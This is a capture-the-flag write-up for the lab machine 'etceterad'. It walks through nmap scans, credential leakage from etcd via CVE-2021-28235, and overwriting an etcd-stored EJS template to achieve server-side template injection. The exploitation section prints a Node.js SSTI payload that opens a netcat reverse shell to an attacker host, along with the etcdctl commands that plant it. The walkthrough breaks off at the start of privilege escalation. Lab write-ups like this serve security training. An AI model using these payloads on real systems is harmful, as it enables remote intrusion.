# Write Up on etceterad machine


## Information Gathering And Enumeration
Let's us first start off by firing up `nmap` to discover open ports and running services on our target. <br>

```
mcsam@0x32:~/$ sudo nmap -vvv 10.0.160.122 -p- --min-rate 10000
Nmap scan report for 10.0.160.122
Host is up (0.27s latency).
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
1337/tcp open  waste   syn-ack ttl 63
2379/tcp open  etcd-client syn-ack ttl 63
```

From the above scan we see that there are three services running. Nmap gives us an idea of the services running on the port and from that we can see that `etcd` is running on port `2379`. There's another service running on `1337` and after doing a service scan on it we realized it's a web application and hence can be accessed via the browser.<br>

```
mcsam@0x32:~/$ sudo nmap -sV 10.0.160.122 -p 1337
Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-11 09:25 GMT
Nmap scan report for 10.0.160.122
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
1337/tcp open  http    Node.js (Express middleware)
```
<br>
Accessing the website from he browser.

![etceterad website](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/1337-website-etcd.png)


After a search for vulnerabilities associated with `etcd` running on `2379` we can find that this version of `etcd` is vulnerable to `CVE-2021-28235`.

PoC for this vulnerability can be found here: https://github.com/lucyxss/etcd-3.4.10-test/blob/master/temp4cj.png

Testing to see if our instance is also vulnerable.
![Vuln PoC](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/debug_poc_2379.png)

## Exploitation
Using this vulnerability we care able to view leaked credetials for authenticating to `etcd`.
![Leaked Creds](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/leaked_creds_from_etctd_vuln.png)

To be able to hack `etcd` we must first understand what it is. `etcd` is a distributed key-value store used to store configuration data and coordinate distributed systems. Effectively, `etcd` acts as a database where clients can query data from the server in a distributed environment.

We can interract with `etcd` buy using the client software called `etcdctl`.
First of all we will have to install the tool if it's not available on current attack machine.

After installing it we can now interact with the `etcd`.
We first send a query to get information about out current user.

```
mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 user get nodejs
User: nodejs
Roles: etsctf
```

From the above query we can see that we have the role `etsctf`. Now we try to see what permissions are available for this role and what we can achieve with it.
```
mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 role get etsctf

Role etsctf
KV Read:
	[/home/, /home0) (prefix /home/)
	[/nodejs/, /nodejs0) (prefix /nodejs/)
	ETSCTF
KV Write:
	[/home/, /home0) (prefix /home/)
	[/nodejs/, /nodejs0) (prefix /nodejs/)
```

From the above results users with the role `etsctf` can read and write to the `/home` and `/nodejs` prefixes.

We will attempt to view the keys under the `/nodejs` prefix.
```
mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 get --prefix "/nodejs/" --keys-only
/nodejs/index
```

Viewing the value stored in the "/nodejs/index" key.
```
mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 get --prefix "/nodejs/index"

/nodejs/index
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <title><% if (typeof title == "undefined") { %>
      EtceteraD
      <% } else { %>
      <%= title %>
      <% }%></title>
      ...
      </body>
</html>
```

From the content of the `/nodejs/index` key we observe and find out that it is the source code for the web site we saw earlier running on port `1337`. Furthermore, we can also see that the source code does some server side rendering and hence may be vulnerable to SSTI. From our initial Nmap scan, nmap reported that the service running on port `1337` was powered by Node.js (Express middleware). This can guide us to know the kind of code to execute inorder to obtain RCE.

Testing our theory.
Since we have write access to `/nodejs/index` key we will write our own content to verify if we can obtain code exeuction. Payload: `Bingo: <%= 7*7 %>`
```
mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 put "/nodejs/index" "Bingo: <%= 7*7 %>" 
OK
```
We reload the web app on port `1337` and bingo!!! <br>
![Leaked Creds](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/ssti_1337_poc.png)

After a number of google searches we find a payload that can help us execute code on the target. We can leverage this to spawn a reverse shell on the target. <br>
Payload: `<%= process.mainModule.require('child_process').execSync('nc 10.10.1.126 8989 -e /bin/bash') %>`

We will further leverage this to obtain a revervseshell using the payload above.
```
mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 put "/nodejs/index" "<%= process.mainModule.require('child_process').execSync('nc 10.10.1.126 8989 -e /bin/bash') %>"
OK
```

We can now start our listener and reload the webpage to get a connection.
```
mcsam@0x32:~/$ rlwrap nc -lnvp 8989
Listening on 0.0.0.0 8989
Connection received on 10.0.160.122 40418
python3 -c "import pty;pty.spawn('/bin/bash')"
nodejs@etceterad:/app$ id
uid=1001(nodejs) gid=1001(nodejs) groups=1001(nodejs)
nodejs@etceterad:/app$ 
```

## Privilege Escalation
First thing we can do is to check our `sudo` privileges on the machine.
```
mcsam@0x32:~/$ sudo -l
Matching Defaults entries for nodejs on etceterad:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nodejs may run the following commands on etceterad:
    (ALL : ALL) NOPASSWD: /usr/local/sbin/fetch_keys
```

